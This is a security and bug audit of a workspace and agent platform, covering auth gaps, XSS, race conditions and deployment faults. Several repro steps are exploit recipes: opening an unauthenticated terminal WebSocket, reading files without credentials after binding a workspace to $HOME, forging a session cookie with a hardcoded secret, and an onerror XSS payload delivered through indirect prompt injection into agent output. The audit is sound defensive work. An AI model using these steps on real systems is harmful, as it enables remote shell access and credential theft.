# Full Platform Bug Audit Findings

Detailed finding catalog for [FULL_PLATFORM_BUG_AUDIT.md](FULL_PLATFORM_BUG_AUDIT.md).

## 6. Detailed Findings

> Findings are grouped by severity (most severe first); within a severity, Confirmed findings precede Probable/Risk/Unverified ones. Every finding was read directly from the file(s) cited — no filename, function, or line number below was invented. "Automatable" reflects whether a mechanical patch is safe to generate without a human security/design decision first.

### BLOCKER

#### SEC-001: Terminal WebSocket endpoint has no authentication at all — full remote shell access
- **Status:** Confirmed · **Severity:** Blocker · **Category:** Broken Authentication / Remote Code Execution
- **Component:** `services/control-plane/app/routes/workspaces.py`, `services/control-plane/app/terminal/session_handler.py`, `services/control-plane/app/auth/middleware.py`
- **Location:** `routes/workspaces.py:67-79` (`workspace_terminal`); `terminal/session_handler.py:40-137` (`handle_terminal_session`)
- **Impact:** Any client that can open a WebSocket to `ws://<host>/api/workspaces/{workspace_id}/terminal` gets an interactive PTY shell in that workspace's project root, as the OS user running control-plane — with zero credential check, independent of `AXON_WATCH_AUTH_MODE`, operator token, or loopback settings.
- **Trigger conditions:** The endpoint is reachable at all (loopback, LAN, or the bundled tunnel — see SEC-003). No prior auth, cookie, or token required.
- **Repro steps:** Connect to `ws://127.0.0.1:8787/api/workspaces/<any-workspace-id>/terminal`. The server calls `await websocket.accept()` (line 47) before any identity check, attaches a live PTY, sends `{"type": "ready", ...}`. Sending `{"type": "input", "data": "id\n"}` writes to the PTY stdin and streams output back.
- **Expected vs Actual:** Expected — the same identity check as mutating HTTP routes. Actual — `MutatingAuthMiddleware` is a `BaseHTTPMiddleware` subclass whose `__call__` explicitly short-circuits for any non-`"http"` ASGI scope (verified against the installed Starlette source); it never runs for WebSocket connections, and `handle_terminal_session` performs no independent check.
- **Root cause:** The app's only auth enforcement point is HTTP-only middleware; the sole WebSocket route was never given an equivalent guard.
- **Evidence:**
  ```python
  # starlette.middleware.base — installed source
  async def __call__(self, scope, receive, send):
      if scope["type"] != "http":
          await self.app(scope, receive, send)
          return
  ```
  ```python
  # terminal/session_handler.py:47 — accept happens unconditionally, before any check
  await websocket.accept()
  ```
- **Recommended fix:** Add an explicit identity check inside `handle_terminal_session` before `websocket.accept()`, mirroring `resolve_mutating_identity` against the handshake request's headers/cookies; close with a 4401-style code on failure. Apply the same pattern to any future WebSocket/SSE route.
- **Regression test:** Integration test opening the terminal WebSocket with `AXON_WATCH_AUTH_MODE=local_token`, loopback-bypass disabled, and no credentials; assert rejection before any PTY output.
- **Automatable:** No — this is a security-boundary design change on the platform's most sensitive route; needs human review of the chosen auth mechanism before merge.
- **Confidence:** High

#### INFRA-001: `docker-compose.dedicated.yml` has no dependency-install step; the image cannot run the app
- **Status:** Confirmed · **Severity:** Blocker · **Category:** Deployment / Containerization
- **Component:** `infra/docker-compose.dedicated.yml`, `infra/docker/README.md`
- **Location:** Lines 4-45 (axon-watch and control-plane service definitions)
- **Impact:** Following this compose file produces two containers that crash-loop immediately (`ModuleNotFoundError: No module named 'uvicorn'`/`fastapi`) — bare `python:3.13-slim` with the repo mounted `:ro` and no install step.
- **Trigger conditions:** `docker compose -f infra/docker-compose.dedicated.yml up` on a fresh host, following the file's own usage comment.
- **Repro steps:** Read the file: `image: python:3.13-slim`, `command: python3 -m uvicorn app.main:app ...`, no `Dockerfile`, no `pip install` anywhere, repo mounted read-only.
- **Expected vs Actual:** Expected a `Dockerfile` installing `-e services/axon-watch`/`-e services/control-plane` (per root `requirements.txt`), or an entrypoint that does `pip install` before `exec uvicorn`. Actual: neither exists.
- **Root cause:** `infra/docker/README.md` itself states this directory "is reserved for future container and compose assets... a placeholder to avoid inventing production packaging before the service contracts settle" — but `docker-compose.dedicated.yml` is not treated as a placeholder; it's a fully fleshed-out file (health checks, `depends_on: condition: service_healthy`, a Caddy service) that looks production-ready but was never exercised end-to-end.
- **Evidence:** `find . -iname "Dockerfile*" -not -path "*/node_modules/*"` returns zero real Dockerfiles repo-wide (only unrelated bundled `dockerfile-*.js` Monaco language chunks).
- **Recommended fix:** Either add real per-service Dockerfiles and switch to `build:`, or delete the compose file (and its `caddy`/`axon-state` volume) until packaging is decided, consistent with the README's own stated intent.
- **Regression test:** CI job running `docker compose -f infra/docker-compose.dedicated.yml config` plus (ideally) `up --build`, asserting both services reach `service_healthy`.
- **Automatable:** Partially — writing a working Dockerfile is mechanical, but the decision to ship vs. remove the compose file is a product call.
- **Confidence:** High

---

### CRITICAL

#### SEC-002: Almost every GET endpoint in the control-plane API is unauthenticated by design
- **Status:** Confirmed · **Severity:** Critical · **Category:** Broken Access Control / Sensitive Data Exposure
- **Component:** `services/control-plane/app/auth/middleware.py`, `workspace_files.py`, `routes/workspaces.py`, `routes/chat.py`, and effectively all ~106 `@router.get` handlers
- **Location:** `auth/middleware.py:23-49` (`_SENSITIVE_GET_PREFIXES`, `_is_sensitive_get`), `:88-136` (`dispatch`)
- **Impact:** Identity is only required for POST/PUT/PATCH/DELETE, or GETs under exactly three prefixes (`/api/vault/secrets`, `/api/vault/export`, `/api/vault/provider-keys`). Every other GET — full workspace file reads, chat transcripts/attachments, tasks, lead plans, missions, host artifacts, email settings — is reachable with no Authorization header, no session cookie, no loopback requirement, regardless of `AXON_WATCH_AUTH_MODE`.
- **Trigger conditions:** API reachable at all (see SEC-003).
- **Repro steps:** `curl http://<host>:8787/api/workspaces` (no headers) succeeds; `curl http://<host>:8787/api/workspaces/<id>/files/README.md` returns file content with no Authorization header even when `AXON_WATCH_AUTH_MODE=local_token` and a real operator token is set.
- **Expected vs Actual:** Expected — deny-by-default for GETs returning non-public data, narrow explicit exemptions. Actual — allow-by-default, narrow explicit protections (only vault).
- **Root cause:** `_SENSITIVE_GET_PREFIXES` was scoped narrowly to vault paths as a targeted patch rather than inverting the model to match the already-conservative mutating-route design.
- **Evidence:**
  ```python
  _SENSITIVE_GET_PREFIXES = ("/api/vault/secrets", "/api/vault/export", "/api/vault/provider-keys")
  requires_identity = (method in _MUTATING and not _is_exempt(path)) or (method == "GET" and _is_sensitive_get(path))
  ```
  No router registration anywhere uses `dependencies=` or per-route `Depends` for auth.
- **Recommended fix:** Require identity for every `/api/*` GET except a short, explicit public allowlist (health, session bootstrap), mirroring the mutating-route model.
- **Regression test:** Iterate every registered GET route under `local_token` mode with no credentials from a non-loopback client; assert none return 200 for data-bearing paths outside an explicit public allowlist.
- **Automatable:** No — inverting the default access model touches ~106 routes and needs a human-reviewed exemption list.
- **Confidence:** High

#### SEC-003: "Remotely reachable" auth enforcement is a manual flag, not derived from actual exposure — the bundled tunnel doesn't set it
- **Status:** Confirmed · **Severity:** Critical · **Category:** Broken Authentication / Insecure Default Configuration
- **Component:** `services/control-plane/app/auth/settings.py`, `bootstrap.py`, `services/axon-watch/app/internal_auth.py`, `services/axon-watch/app/tunnel/tunnel_control.py`, `config/tunnel-slice.json`
- **Location:** `auth/settings.py:57-66` (`is_remotely_reachable`); `bootstrap.py:26-48`; `tunnel/tunnel_control.py:24-28` (`tunnel_autostart_enabled`, defaults `"1"`); `config/tunnel-slice.json` (`"enabled": true`, committed)
- **Impact:** Both `MutatingAuthMiddleware` and axon-watch's `InternalServiceTokenMiddleware` gate credential requirements on `is_remotely_reachable()`, a pure env-var heuristic unrelated to whether the process is actually internet-reachable. The repo ships the tunnel enabled and autostarting by default; starting it exposes the service via the tunnel URL but does **not** touch `AXON_WATCH_REMOTELY_REACHABLE`/`AXON_WATCH_PUBLIC_BASE_URL`. An operator who enables the tunnel from the console (the normal path) rather than the dedicated-server install script never sets those, so both services believe they're local-only and skip auth — combining directly with SEC-001/SEC-002.
- **Trigger conditions:** Tunnel started (autostart-on by default) without separately exporting `AXON_WATCH_REMOTELY_REACHABLE=1`.
- **Repro steps:** Inspect the control-plane process env for the two flags; separately confirm the tunnel is active. No exploitation needed — this is a config-state check.
- **Expected vs Actual:** Expected — enabling the tunnel should itself force the remote-auth posture, or refuse to start without a token configured. Actual — fully decoupled; only mitigation is a startup log line.
- **Root cause:** `is_remotely_reachable()` infers exposure from configuration intent, not real network state, and nothing in the tunnel-start path cross-checks it.
- **Evidence:** The codebase's own `_log_auth_posture()` docstring explicitly acknowledges this exact gap ("a process bound to 0.0.0.0 without that env set still resolves to 'off' silently... it just stops that gap from being invisible").
- **Recommended fix:** When `tunnel_start()` succeeds, OR that fact into `is_remotely_reachable()`, or refuse to start the tunnel without an operator token already configured. Document `AXON_WATCH_INTERNAL_SERVICE_TOKEN` in `deployment.env.example` (currently absent).
- **Regression test:** Start a mock tunnel with neither flag set; assert the service now requires credentials for mutating/confidential routes.
- **Automatable:** No — security-posture design decision.
- **Confidence:** High

#### INFRA-002: `docker-compose.dedicated.yml` reads secrets/config from the checked-in example file, not the documented `.env`
- **Status:** Confirmed · **Severity:** Critical · **Category:** Deployment / Secrets Handling
- **Component:** `infra/docker-compose.dedicated.yml`
- **Location:** Lines 2, 11-12, 32-33
- **Impact:** The file's header instructs `copy config/deployment.env.example to .env and adjust host paths`, but both services declare `env_file: - ./config/deployment.env.example` — never `.env`. An operator who copies-and-edits `.env` has every edit silently ignored; the container loads the example verbatim, including `AXON_WATCH_OPERATOR_TOKEN=replace-me` and `AXON_WATCH_PUBLIC_BASE_URL=https://axon.example.com`.
- **Trigger conditions:** Deploying via this compose file exactly as documented.
- **Repro steps:** `grep -A1 env_file infra/docker-compose.dedicated.yml` shows `./config/deployment.env.example` in both blocks; `.env` is never referenced.
- **Expected vs Actual:** Expected `env_file: - ./.env`. Actual: hardcoded reference to the tracked example.
- **Root cause:** Stale/copy-paste reference never updated to match the usage instructions.
- **Evidence:** Because `AXON_WATCH_PUBLIC_BASE_URL` is non-loopback, `is_remotely_reachable()` correctly forces `local_token` auth mode — but the token it would enforce is literally the public string `"replace-me"`, a de facto backdoor credential.
- **Recommended fix:** Change `env_file` to `./.env` (or `${COMPOSE_ENV_FILE:-.env}`); add a pre-flight check that fails loudly if `AXON_WATCH_OPERATOR_TOKEN` still equals `replace-me`.
- **Regression test:** Assert the effective container environment does not contain the placeholder token when a differently-configured `.env` is present.
- **Automatable:** Yes, low-risk — a one-line path fix plus an optional guard script.
- **Confidence:** High (currently non-exploitable only because INFRA-001 means the containers don't boot at all — latent until someone fixes the install gap without also fixing this)

#### FE-001: Unsanitized markdown → `v-html` renders agent/tool output with no HTML sanitization (XSS)
- **Status:** Confirmed · **Severity:** Critical · **Category:** XSS / Unsafe HTML Rendering
- **Component:** `apps/console-web/src/lib/agent-message-markdown.ts` (root cause), consumed by `components/ide/AgentMarkdownBlock.vue:35`, `AgentLeadStandupBlock.vue:66,72,80`, `AgentEditBlock.vue:211`, `components/shell/CenterWorkbench.vue:660`
- **Location:** `renderAgentMessageMarkdown()` — calls `marked.parse(linked, { async: false })` and returns the raw HTML string with no sanitization step.
- **Impact:** This is an authenticated operator console with Vault-secret access and agent/workspace control. Agent replies and Lead reports routinely echo back content fetched from external sources (email bodies, Sentry issue titles, scraped web content). Any HTML with executable event-handler attributes (`<img src=x onerror=...>`, `<svg onload=...>`) renders unsanitized in the operator's authenticated session — an indirect-prompt-injection → stored XSS chain.
- **Trigger conditions:** Any content path where agent output contains attacker-influenced HTML that reaches `renderAgentMessageMarkdown`.
- **Repro steps:** Have an agent narrate/quote text containing `<img src=x onerror="alert(document.cookie)">` (e.g., read from an email or web page) back into chat; it renders through `AgentMarkdownBlock.vue`'s `v-html`, executing the payload.
- **Expected vs Actual:** Expected — sanitized (allow-listed) HTML before `v-html`. Actual — no sanitizer anywhere in the pipeline; `marked ^18.0.5` passes inline HTML straight through by default, and no `dompurify`/`sanitize-html`/`xss` dependency exists anywhere in the repo.
- **Root cause:** `marked.parse()` output is trusted directly; the one `marked.use({ hooks: { postprocess } })` override (table-wrapping) does not filter markup.
- **Evidence:**
  ```ts
  const html = marked.parse(linked, { async: false }) as string;
  return rewriteMarkdownImageSources(html, options);
  ```
  ```html
  <div ... v-html="previewHtml" @click="handleMarkdownClick" />
  ```
- **Recommended fix:** Sanitize the `marked.parse()` output (e.g., `DOMPurify.sanitize(html, {...})`) once inside `renderAgentMessageMarkdown`, so every `v-html` consumer is covered by a single choke point; strip `on*` attributes and `javascript:`/`data:` URLs; disallow `<iframe>`/`<object>`/`<embed>`/`<form>`.
- **Regression test:** Unit test `renderAgentMessageMarkdown('<img src=x onerror=alert(1)>')`, assert no `onerror`/`onload`/`javascript:` substrings in the output.
- **Automatable:** Yes, low-risk — adding a well-known sanitizer at one choke point is mechanical and safe to generate; still worth a quick human pass on the allow-list.
- **Confidence:** High

---

### HIGH

#### FE-002: Live Ops ticker truncates the confidence-failure message mid-word, dropping the retry call-to-action
- **Status:** Confirmed (reproduced via the project's own failing test) · **Severity:** High · **Category:** State Bug / Broken Copy
- **Component:** `apps/console-web/src/features/brain-galaxy/live-operations-stream.ts` (`truncate()`, line 33, 96-char cap; call site ~line 323) interacting with `apps/console-web/src/features/workspace-agents/company-roster-failure-view.ts:102`
- **Impact:** The Mission Control "Live Operations" ticker — the surface that tells the operator *why* an employee's shift failed and what to do — shows a garbled, mid-word-truncated message and silently drops "Tap Try again to close it out." for the single most common failure mode this code path exists to explain.
- **Trigger conditions:** Any employee whose `last_outcome_detail` matches `isMissingConfidenceFailure()`.
- **Repro steps:** `npx vitest run` fails `live-operations-stream.test.ts > surfaces advise, critical signals, and failed employee shifts`. Independently confirmed: truncating the current 131-char failure copy at 96 chars yields `"...was mis…"`, dropping "sing. Tap Try again to close it out."
- **Expected vs Actual:** Expected the ticker line to stay readable and keep the retry instruction. Actual: cut off mid-word, CTA lost.
- **Root cause:** The failure copy was lengthened (88→131 chars, currently uncommitted) without checking that `live-operations-stream.ts` independently truncates any failure line to 96 chars. The same longer string is used untruncated elsewhere (tooltip, roster card), so only this ticker call site breaks.
- **Evidence:** `git diff -- .../company-roster-failure-view.ts` shows the copy change; `truncate(text, max = 96)` at `live-operations-stream.ts:33-39`.
- **Recommended fix:** Shorten the copy to fit under ~90 chars, or have `truncate()` break on a word boundary, or raise `max` for this call site.
- **Regression test:** Assert the ticker item's `.text` is ≤96 chars and does not end mid-word.
- **Automatable:** Yes, low-risk.
- **Confidence:** High

#### BE-001: Watch command retry produces duplicate side effects despite idempotent-looking design
- **Status:** Confirmed · **Severity:** High · **Category:** Race Condition / Idempotency
- **Component:** `services/axon-watch/app/commands/service.py`
- **Location:** `submit_watch_command`, lines 21-54
- **Impact:** A retried `POST /internal/watch/commands` (or the control-plane proxy) with the same `command_id` can execute the underlying action (`reprobe_connector`, `refresh_summary`, `acknowledge_signal`) twice instead of returning the cached result, appending duplicate events into the watch log.
- **Trigger conditions:** Two requests with the same `command_id` arrive close enough that both read `get_command(command_id) is None` before either writes. Realistic under normal client retry-on-timeout behavior.
- **Repro steps:** Fire two concurrent `POST /internal/watch/commands` with identical `command_id`; both threads pass the `existing is None` guard before either calls `save_command`.
- **Expected vs Actual:** Expected — second call returns the cached result. Actual — both execute.
- **Root cause:** Check-then-act (`get_command` → branch → `save_command`) with no lock/transaction spanning both, and the route handler is a sync `def` (real thread-pool concurrency, not theoretical).
- **Evidence:**
  ```python
  existing = command_store.get_command(command_id)
  if existing is not None:
      return {"accepted": True, ...}
  command_store.save_command(record)
  result = execute_watch_command(record)  # runs unconditionally if the race is lost
  ```
- **Recommended fix:** Make the claim atomic (`INSERT ... ON CONFLICT DO NOTHING`, check rowcount) or take a per-`command_id` in-process lock around check-and-execute.
- **Regression test:** Two threads submitting the same `command_id` concurrently (via `threading.Barrier`) should yield exactly one execution and one `command_completed` event.
- **Automatable:** Partially — the atomic-insert fix is mechanical; the concurrency regression test should get a human look before merge.
- **Confidence:** High

#### SEC-004: Hardcoded fallback secret for desktop session-cookie signing
- **Status:** Confirmed · **Severity:** High · **Category:** Authentication Bypass / Hardcoded Secret
- **Component:** `services/control-plane/app/auth/desktop_session.py`
- **Location:** `desktop_session.py:21-27` (`_session_secret`)
- **Impact:** The HMAC secret signing the `axon_desktop_session` cookie (and equivalent `x-axon-desktop-session` header) falls back to the literal string `"axon-desktop-dev"` when neither `AXON_WATCH_DESKTOP_SESSION_SECRET` nor `AXON_WATCH_OPERATOR_TOKEN` is set. A deployment using only `AXON_WATCH_OPERATOR_PASSWORD` for auth (documented, supported) and never setting the other two uses a well-known, source-visible signing key — full authentication bypass on every mutating route.
- **Trigger conditions:** `AXON_WATCH_DESKTOP_SESSION_SECRET` and `AXON_WATCH_OPERATOR_TOKEN` both unset, `AXON_WATCH_OPERATOR_PASSWORD` set (or auth mode off but reachable).
- **Repro steps:** Compute `hmac_sha256(sha256("axon-desktop-dev"), nonce)`, send it as `x-axon-desktop-session: <nonce>.<digest>`; `validate_session_token` accepts it as identity `"desktop_session"`.
- **Expected vs Actual:** Expected fail-closed on a missing deployment-specific secret. Actual — silent fallback to a fixed, guessable value.
- **Root cause:** The fallback chain treats "no secret configured" as "use a stable dev default."
- **Evidence:**
  ```python
  def _session_secret() -> bytes:
      raw = (os.environ.get("AXON_WATCH_DESKTOP_SESSION_SECRET")
             or os.environ.get("AXON_WATCH_OPERATOR_TOKEN")
             or "axon-desktop-dev").strip()
      return hashlib.sha256(raw.encode("utf-8")).digest()
  ```
- **Recommended fix:** Require the secret explicitly, or derive+persist a random one at first boot under the state dir (0600 perms), rather than a literal fallback.
- **Regression test:** Assert session issuance/validation refuse to operate when no secret-bearing env var is set.
- **Automatable:** Yes, low-risk for the fail-closed change; the persisted-random-secret variant deserves a quick review.
- **Confidence:** High

#### SEC-005: Workspace binding allowlist permits binding a workspace root to the operator's entire home directory
- **Status:** Confirmed · **Severity:** High (compounds directly with SEC-002) · **Category:** Broken Access Control
- **Component:** `services/control-plane/app/workspace_project_bindings.py`
- **Location:** `workspace_project_bindings.py:40-62` (`project_root_allowlist`)
- **Impact:** The default allowlist (when `AXON_WATCH_PROJECT_ROOT_ALLOWLIST` is unset) includes `Path.home()` in full. Any caller of `POST /api/workspaces` can register a workspace whose `project_root` is `$HOME` itself; combined with SEC-002 (unauthenticated file-read GETs), the entire home directory — SSH keys, cloud CLI credentials, browser profiles, other projects — becomes readable through the file-read endpoint.
- **Trigger conditions:** Default allowlist (unset override), ability to call `POST /api/workspaces`, then any GET to the file-read routes.
- **Repro steps:** `POST /api/workspaces` with `project_root=$HOME`; `GET /api/workspaces/<id>/files` then lists/reads everything under home.
- **Expected vs Actual:** Expected — narrow, operator-approved project directories only. Actual — implicitly "anything under $HOME."
- **Root cause:** The allowlist was designed as a coarse safety net ("don't point at `/etc` or `/`"), not a least-privilege boundary, yet it's the only boundary between the files API and the whole home directory.
- **Evidence:**
  ```python
  defaults = [repo_root.resolve(), repo_root.parent.resolve(), Path.home().resolve()]
  ```
- **Recommended fix:** Default to the repo root and immediate siblings only; require an explicit step-up confirmation (`app/auth/step_up.py` already exists) before binding outside the repo tree.
- **Regression test:** Assert `upsert_workspace_project_binding` rejects `project_root=str(Path.home())` under the default allowlist without step-up.
- **Automatable:** Partially — narrowing the default is mechanical; wiring step-up needs product/security input.
- **Confidence:** Medium-High

#### DB-002: `workspace_tasks`/`workspace_handoffs` have two drifted DDL sources; a real code path can crash with "no such column"
- **Status:** Confirmed (reproduced) · **Severity:** High · **Category:** Schema Integrity / Migration Risk
- **Component:** `services/control-plane/app/persistence/run_store_sqlite.py`, `task_store.py`, `handoff_store.py`, `workspace_mission_store.py`
- **Location:** `run_store_sqlite.py:289-327` (lean inline DDL, 16 cols, missing `mission_id` etc.); `task_store.py:88-140` (authoritative DDL, 20 cols, `ALTER TABLE` patch loop); `workspace_mission_store.py:291-297` (`attach_task_mission`, writes `mission_id` via a connection that never calls `task_store.ensure_task_ledger_schema()`)
- **Impact:** If `workspace_tasks` is first materialized via the lean DDL, any subsequent raw SQL referencing `mission_id`/`exclusive_paths_json`/`allowed_paths_json`/`approval_receipt_id` fails with `sqlite3.OperationalError: no such column`.
- **Trigger conditions:** A fresh/new local SQLite file, or any new/reordered caller that reaches `attach_task_mission()` before any `task_store.*` function has run in-process. Today's only call site is incidentally safe (task_store always runs first via `workspace_missions/service.py`), but `attach_task_mission` is exported in `__all__` with no schema guard of its own.
- **Repro steps (executed):**
  ```
  python3 -c "
  import sys, tempfile, os
  sys.path.insert(0, 'services/control-plane')
  os.environ['AXON_WATCH_CONTROL_PLANE_DB'] = os.path.join(tempfile.mkdtemp(), 'repro.sqlite3')
  from app.persistence import workspace_mission_store as wms
  wms.attach_task_mission('task-x', 'mission-x')
  "
  # -> sqlite3.OperationalError: no such column: mission_id
  ```
- **Expected vs Actual:** Expected one owned schema per table, or every writer calling that table's schema-ensure function first. Actual — three files each carry partial DDL+patch logic for the same two tables; drift already happened.
- **Root cause:** `run_store_sqlite.py` explicitly avoids importing `task_store` (documented comment: dual-app tests swap `app.persistence` in `sys.modules`, an absolute import can resolve the watch package and break schema-ensure mid-setUp). That test-time workaround traded one bug for another, with nothing keeping the two DDL copies in sync.
- **Recommended fix:** Make `run_store_sqlite.py`'s inline DDL the single source of truth (include all columns), or have `attach_task_mission()` call `task_store.ensure_task_ledger_schema(connection)` first (already idempotent/lock-guarded). Longer-term: one `schema_version` table plus an ordered migration list (see DB-007).
- **Regression test:** Fresh temp DB, call `attach_task_mission()` as the very first DB operation in-process; assert no exception. Repeat for `workspace_handoffs`/`mission_id`.
- **Automatable:** Partially — the one-line fix (call `ensure_task_ledger_schema` first) is mechanical and low-risk; the "single source of truth" refactor needs review given the documented test-import constraint.
- **Confidence:** High (reproduced directly)

#### DB-003: `run_store.list_runs()` is a fully unbounded `SELECT *`, used in ~35 hot call sites including the scheduler's per-tick loop
- **Status:** Confirmed · **Severity:** High · **Category:** Unbounded Query / Scalability
- **Component:** `services/control-plane/app/persistence/run_store.py`, `runs/employee_retention.py`, `workspace_agents/scheduler.py`
- **Location:** `run_store.py:147-151` — `SELECT * FROM runs ORDER BY started_at ASC, run_id ASC`, no `LIMIT`
- **Impact:** As `runs` grows, every scheduler tick and ~35 call sites (scheduler, reconcile loops, platform_recovery, chat orchestration, data snapshot) perform a full table scan and materialize every row in memory — O(n) cost paid repeatedly, worsening over a deployment's lifetime. `employee_retention.py`'s own bookkeeping query is itself unbounded, and it explicitly skips operator-initiated (role-less) runs — the likely majority of chat-driven activity accumulates forever with no pruning.
- **Trigger conditions:** Long-running deployment; this platform explicitly runs continuous scheduled worker/lead shifts.
- **Expected vs Actual:** Expected — pagination or scoped queries (the pattern already exists: `list_failed_runs_since()` filters by phase+timestamp using real indexes). Actual — the default-reached `list_runs()` is unindexed-by-usage and unbounded.
- **Root cause:** No pagination contract was ever added; callers re-filter the full result in Python.
- **Evidence:** `runs/employee_retention.py:42-51` — pruning explicitly `continue`s for role-less runs; no other archival/retention code exists repo-wide (grep for `retention|archive_run|prune_run|purge_run`).
- **Recommended fix:** Add `LIMIT`/keyset pagination to `list_runs()` (or a paged variant); migrate hot callers to the existing `idx_runs_phase`/`idx_runs_updated_at`/`idx_runs_task_id` indexes. Extend retention to also bound operator-initiated terminal runs, or explicitly document unbounded retention with a size guardrail/alert.
- **Regression test:** Seed 5,000 terminal role-less runs; assert row count is bounded after a retention pass (currently fails).
- **Automatable:** Partially — adding `LIMIT` is mechanical; migrating ~35 call sites to scoped queries needs review per-caller.
- **Confidence:** High

#### DB-006: No backup/recovery mechanism exists for any local SQLite state
- **Status:** Confirmed · **Severity:** High (Medium-High) · **Category:** Backup Gap
- **Component:** `services/control-plane/app/platform_recovery/`, `fleet_self_heal/`, repo-wide
- **Impact:** SQLite is the exclusive persistence layer; nowhere in the repo is there use of the SQLite online-backup API, `VACUUM INTO`, `.dump`/`iterdump`, or any scheduled file copy of `.local/state/*.sqlite3`. `platform_recovery`/`fleet_self_heal` — the modules whose names most suggest this — only do application-level run/recovery reconciliation, not disk backup. A lost/corrupted `.local/state` directory has no recovery path beyond starting from an empty schema.
- **Trigger conditions:** Disk loss, accidental `rm`, or corruption of any of the ~7 SQLite files a deployment creates.
- **Repro steps:** `grep -rn "sqlite3_backup|\.backup(|iterdump" services/ scripts/` → no hits; `grep -rln "backup"` → only vault import/export (secret-record export, not DB file backup) and an unrelated migration script.
- **Expected vs Actual:** Expected at minimum a documented/scripted periodic `VACUUM INTO` or file-copy backup. Actual — none.
- **Root cause:** Persistence was built incrementally per-feature without a backup story ever being assigned.
- **Recommended fix:** Add a scheduled job (or ops script) running `VACUUM INTO` for each `.local/state/*.sqlite3` into a timestamped backup location with basic retention; document restore steps.
- **Regression test:** N/A directly — add an ops smoke test that a backup script produces a restorable file with expected tables.
- **Automatable:** Yes, low-risk — a backup script is additive and safe to generate; scheduling/retention policy is an ops decision.
- **Confidence:** Medium (absence-of-evidence claim; thorough grep coverage, cannot rule out an undocumented external process)

#### REL-001: Recovery Center's action buttons are mostly non-functional no-ops — only 3 of ~11 action labels are wired
- **Status:** Confirmed · **Severity:** High · **Category:** Self-Healing UI / Operator Control Wiring
- **Component:** `apps/console-web/src/components/shell/RecoveryCenterPanel.vue` (lines 52-64), `services/control-plane/app/platform_recovery/projection.py` (lines 176-187, `_actions_for`)
- **Impact:** The backend produces action labels `Inspect, Open Logs, Open Evidence, Reconcile, Resume, Retry, Cancel, Acknowledge, Open Worktree, Open Verification, Approve` depending on bucket. The panel renders one button per label unconditionally, but `onAction()` only branches on `'Resume'`, `'Acknowledge'`, `'Reconcile'`. Every other button falls through, does nothing, and the function proceeds straight to `refresh()` — no error, no toast, no console warning. This hits exactly the buckets (`STALE`, `ORPHANED`, `RETRYABLE`, `FAILED`, `BLOCKED`) that most need operator action.
- **Trigger conditions:** Any Recovery Center item in those buckets.
- **Repro steps:** Cross-reference `RecoveryCenterPanel.vue:52-64` against `projection.py:176-187`'s string literals.
- **Expected vs Actual:** Expected every label to have a handler (even a modal/external link). Actual — 8 of 11 distinct labels have zero handling, and `routes/platform_recovery.py` has **no backend endpoint at all** for Retry/Cancel/Approve — so wiring the frontend alone wouldn't be enough.
- **Root cause:** The backend action vocabulary and per-bucket label sets were extended without keeping the frontend's `onAction` switch (or the missing backend routes) in sync.
- **Evidence:**
  ```
  // onAction only handles 'Resume' | 'Acknowledge' | 'Reconcile', else falls through to refresh()
  ```
  Confirmed full endpoint list on `routes/platform_recovery.py`: no `/retry`, `/cancel`, or `/approve` route exists anywhere.
- **Recommended fix:** Either implement the missing endpoints and wire them into `onAction`, or shrink `_actions_for()`'s per-bucket lists to only wired labels, and/or disable+tooltip unimplemented buttons so operators aren't misled.
- **Regression test:** A test asserting every label producible by `_actions_for()` has a matching `onAction` branch, so a new label fails CI until wired.
- **Automatable:** Partially — disabling unwired buttons is mechanical; implementing the missing Retry/Cancel/Approve endpoints is a real feature build needing product scoping.
- **Confidence:** High

#### BE-002: Watch event log `sequence` assignment race can raise an unhandled `IntegrityError`
- **Status:** Highly Probable · **Severity:** High · **Category:** Race Condition / Unhandled Exception
- **Component:** `services/axon-watch/app/events/store.py`; schema at `services/axon-watch/app/persistence/watch_store_sqlite.py:46-51`
- **Location:** `append_event`, lines 58-79
- **Impact:** Concurrent `append_event` calls (background monitor threads racing HTTP-request threads) can compute the same `next_sequence` before either commits. `sequence` is `INTEGER NOT NULL UNIQUE`; the losing writer's `INSERT` raises `sqlite3.IntegrityError`, uncaught anywhere in `append_event` or its callers — a request/command fails with an unhandled exception instead of a clean error or retry.
- **Trigger conditions:** Two threads/connections calling `append_event` concurrently against the same DB file (normal once more than one monitor thread or HTTP worker is active).
- **Repro steps (not executed under load in this read-only audit; mechanism confirmed by code+schema read):** Call `append_event` from two threads simultaneously against a shared DB; expect intermittent `UNIQUE constraint failed: watch_events.sequence`.
- **Expected vs Actual:** Expected — every append succeeds or is transparently retried with a unique sequence. Actual — the race loser crashes.
- **Root cause:** `_next_sequence` (`SELECT MAX(sequence)+1`) and the `INSERT` are two separate statements with no `BEGIN IMMEDIATE`/retry wrapping.
- **Evidence:**
  ```python
  def _next_sequence(connection) -> int:
      row = connection.execute("SELECT COALESCE(MAX(sequence), 0) FROM watch_events").fetchone()
      return int(row[0]) + 1
  sequence = _next_sequence(connection)
  connection.execute("INSERT INTO watch_events (...) VALUES (?, ?, ?, ?)", (event["event_id"], sequence, ...))
  ```
- **Recommended fix:** Use `INTEGER PRIMARY KEY AUTOINCREMENT`-style allocation, or wrap select+insert in `BEGIN IMMEDIATE`, or catch `IntegrityError` and retry with a freshly-read sequence.
- **Regression test:** N threads concurrently calling `append_event`; assert all N succeed with N distinct sequences and no unhandled exception.
- **Automatable:** Yes, low-risk — the `BEGIN IMMEDIATE` or retry-on-conflict fix is mechanical.
- **Confidence:** Medium-High (mechanism confirmed by code+schema; not reproduced under live load)

---

### MEDIUM

#### FE-003: Email settings panel removes the Signal-bridge UI, but backing fields (and PATCH) remain
- **Status:** Confirmed (code) / Highly Probable (functional impact) · **Severity:** Medium · **Category:** Incomplete Refactor
- **Component:** `apps/console-web/src/components/settings/EmailSettingsPanel.vue`, `useEmailSettingsMailbox.ts:140-160`, `api/email-settings-api.ts:33-34,46,93`
- **Impact:** For any workspace with `bridge_enabled: true` from before this change, the operator now has no UI to see or turn it off — the panel silently keeps re-submitting whatever value is on the snapshot. The concept was deprecated in UI copy while the data model and network payload stayed fully intact.
- **Trigger conditions:** A workspace with a pre-existing enabled bridge, viewed after this change ships.
- **Repro steps:** `bridge_enabled`/`bridge_workspace_id` are absent from the template but still present and PATCHed in `useEmailSettingsMailbox.ts:146-151`.
- **Recommended fix:** Either finish the removal (drop the fields from the patch payload/type, coordinating with the backend) or add a minimal read-only "Signal bridge: Enabled/Off" line.
- **Regression test:** Assert the panel surfaces `bridge_enabled: true` somewhere in rendered output when present in a fetched snapshot.
- **Automatable:** Partially — a read-only status line is mechanical; the coordinated backend removal needs a human decision.
